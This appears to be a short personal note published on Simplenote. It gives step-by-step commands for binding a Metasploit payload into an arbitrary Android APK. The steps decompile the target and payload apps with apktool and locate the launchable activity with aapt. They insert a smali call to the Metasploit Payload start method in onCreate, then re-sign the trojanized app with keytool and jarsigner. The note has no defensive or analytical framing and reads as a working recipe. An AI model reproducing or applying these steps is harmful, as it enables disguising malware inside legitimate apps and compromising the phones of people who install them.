@@ -1,0 +1,26 @@
+
+
+Binding payload in apk
+
+android-sdk-build-tools apktool
+
+$ apktool d any.apk
+$ apk d msfpayload.apk
+
+for finding starting point of app or launchable activity
+
+$ aapt dump badging any.apk
+
+launchable-activity
+note the dir
+
+edit that file and find "oncreate"
+
+invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
+
+
+keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
+
+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore any.apk alias_name
+Published with Simplenote
+Report abuse
